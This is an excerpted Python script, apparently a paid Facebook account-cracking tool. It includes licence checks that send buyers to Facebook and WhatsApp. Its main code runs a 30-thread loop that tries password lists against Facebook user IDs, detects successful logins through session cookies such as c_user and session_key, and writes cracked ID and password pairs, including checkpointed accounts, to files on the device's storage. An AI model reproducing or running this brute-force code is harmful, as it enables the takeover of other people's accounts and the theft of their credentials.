#NYUSHAN IS THE KING OF ALL CODERS
...
os.system('xdg-open https://www.facebook.com/nyushan.don1/')
...
try:
        ...
        os.system('python nyushanhero.py')
...
Author    : NYUSHAN DON
Github    : [ ERROR ]
Facebook  : NYUSHAN DON
Tool Name : NYUSHAN-PRO
Tool Type : PAID
Version   : 3.0.0
----------------------------------------------
THIS IS PAID TOOL - PAY TO USE
NYUSHAN XD THE FATHER OF ALL CODERS
\033[1;37m-------------------------------------------- """)
...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m YOUR ID IS NOT ACTIVE COPYðŸ‘† AND SEND ME MESSAGE ON FACEBOOK \033[0;91m#NOT FREE!!!") 

      os.system('xdg-open  https://www.facebook.com/nyushan.don1?text=*Hello*%2C%20*Blessing*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%Full Updated*Updated*')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/nyushan.don1');menu()
                        ...
                        tks = ("Hi NYUSHAN Sir, I Need To Buy Your Paid NYUSHAN PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python nyushanhero.py')
...
def pak():
                ...
                with tred(max_workers=30) as NYUSHAN:     
                        ...
                        for psx in user:
                                ...
                                NYUSHAN.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [NYUSHAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        NYUSHAN=session.cookies.get_dict().keys()

                        if "c_user" in NYUSHAN:

                                coki=session.cookies.get_dict()

                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])

                                print('\r\r\033[1;32m [NYUSHAN-OK] %s | %s'%(ids,pas))

                                open('/sdcard/NYUSHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in NYUSHAN:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [NYUSHAN-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/NYUSHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [NYUSHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/NYUSHAN-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [NYUSHAN-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/NYUSHAN-OK.txt','a').write(uid+'|'+pas+'\n')
